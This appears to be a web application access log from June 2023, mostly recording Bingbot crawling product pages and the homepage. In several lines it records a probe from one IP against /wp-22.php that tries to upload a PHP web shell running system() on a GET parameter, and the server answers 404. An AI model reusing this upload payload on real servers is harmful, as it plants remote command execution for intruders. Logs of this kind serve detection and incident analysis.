[2023-06-16 00:50:15,652151] front.INFO  [NULL] [e821f482] [NULL] [LogListener:onKernelRequestEarly:47] - INIT   [GET, /products/detail/64, 52.167.144.162, NULL, Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36]
[2023-06-16 00:50:15,652845] front.INFO  [NULL] [e821f482] [NULL] [LogListener:onKernelRequest:60] - PROCESS START ["product_detail"]  [GET, /products/detail/64, 52.167.144.162, NULL, Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36]
[2023-06-16 00:50:15,664126] front.INFO  [09a21372] [e821f482] [NULL] [LogListener:onKernelController:73] - LOGIC START ["product_detail"]  [GET, /products/detail/64, 52.167.144.162, NULL, Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36]
[2023-06-16 00:50:15,708625] front.INFO  [09a21372] [e821f482] [NULL] [LogListener:onKernelResponse:86] - LOGIC END ["product_detail"]  [GET, /products/detail/64, 52.167.144.162, NULL, Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36]
[2023-06-16 00:50:15,709381] front.INFO  [09a21372] [e821f482] [NULL] [LogListener:onKernelTerminate:95] - PROCESS END ["product_detail"]  [GET, /products/detail/64, 52.167.144.162, NULL, Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36]
[2023-06-16 02:51:13,965040] front.INFO  [NULL] [d5c13ecb] [NULL] [LogListener:onKernelRequestEarly:47] - INIT   [GET, /, 52.167.144.162, NULL, Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36]
[2023-06-16 02:51:13,965752] front.INFO  [NULL] [d5c13ecb] [NULL] [LogListener:onKernelRequest:60] - PROCESS START ["homepage"]  [GET, /, 52.167.144.162, NULL, Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36]
[2023-06-16 02:51:13,975294] front.INFO  [5ba0361d] [d5c13ecb] [NULL] [LogListener:onKernelController:73] - LOGIC START ["homepage"]  [GET, /, 52.167.144.162, NULL, Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36]
[2023-06-16 02:51:14,002210] front.INFO  [5ba0361d] [d5c13ecb] [NULL] [LogListener:onKernelResponse:86] - LOGIC END ["homepage"]  [GET, /, 52.167.144.162, NULL, Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36]
[2023-06-16 02:51:14,003669] front.INFO  [5ba0361d] [d5c13ecb] [NULL] [LogListener:onKernelTerminate:95] - PROCESS END ["homepage"]  [GET, /, 52.167.144.162, NULL, Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36]
[2023-06-16 02:53:19,642241] front.INFO  [NULL] [9f08177c] [NULL] [LogListener:onKernelRequestEarly:47] - INIT   [GET, /wp-22.php?sfilename=0x0.php&sfilecontent=%3C?=echo%20system($_GET%5B%22ll%22%5D;%20);&supfiles=0x0.php, 194.169.175.35, NULL, Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)]
[2023-06-16 02:53:19,644107] front.INFO  [NULL] [9f08177c] [NULL] [LogListener:onKernelException:105] - No route found for "GET /wp-22.php" [404]  [GET, /wp-22.php?sfilename=0x0.php&sfilecontent=%3C?=echo%20system($_GET%5B%22ll%22%5D;%20);&supfiles=0x0.php, 194.169.175.35, NULL, Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)]
[2023-06-16 02:53:19,646722] front.INFO  [7f4b5f9e] [9f08177c] [NULL] [LogListener:onKernelResponse:86] - LOGIC END [null]  [GET, /wp-22.php?sfilename=0x0.php&sfilecontent=%3C?=echo%20system($_GET%5B%22ll%22%5D;%20);&supfiles=0x0.php, 194.169.175.35, NULL, Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)]
[2023-06-16 02:53:19,647033] front.INFO  [7f4b5f9e] [9f08177c] [NULL] [LogListener:onKernelTerminate:95] - PROCESS END [null]  [GET, /wp-22.php?sfilename=0x0.php&sfilecontent=%3C?=echo%20system($_GET%5B%22ll%22%5D;%20);&supfiles=0x0.php, 194.169.175.35, NULL, Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)]
[2023-06-16 03:20:59,743794] front.INFO  [NULL] [3aa93627] [NULL] [LogListener:onKernelRequestEarly:47] - INIT   [GET, /products/detail/80, 52.167.144.162, NULL, Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36]
[2023-06-16 03:20:59,744539] front.INFO  [NULL] [3aa93627] [NULL] [LogListener:onKernelRequest:60] - PROCESS START ["product_detail"]  [GET, /products/detail/80, 52.167.144.162, NULL, Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36]
[2023-06-16 03:20:59,753948] front.INFO  [46f48833] [3aa93627] [NULL] [LogListener:onKernelController:73] - LOGIC START ["product_detail"]  [GET, /products/detail/80, 52.167.144.162, NULL, Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36]
[2023-06-16 03:20:59,801169] front.INFO  [46f48833] [3aa93627] [NULL] [LogListener:onKernelResponse:86] - LOGIC END ["product_detail"]  [GET, /products/detail/80, 52.167.144.162, NULL, Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36]
[2023-06-16 03:20:59,801773] front.INFO  [46f48833] [3aa93627] [NULL] [LogListener:onKernelTerminate:95] - PROCESS END ["product_detail"]  [GET, /products/detail/80, 52.167.144.162, NULL, Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36]
[2023-06-16 03:55:04,144962] front.INFO  [NULL] [0e0e3b84] [NULL] [LogListener:onKernelRequestEarly:47] - INIT   [GET, /, 138.64.80.187, NULL, Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1]
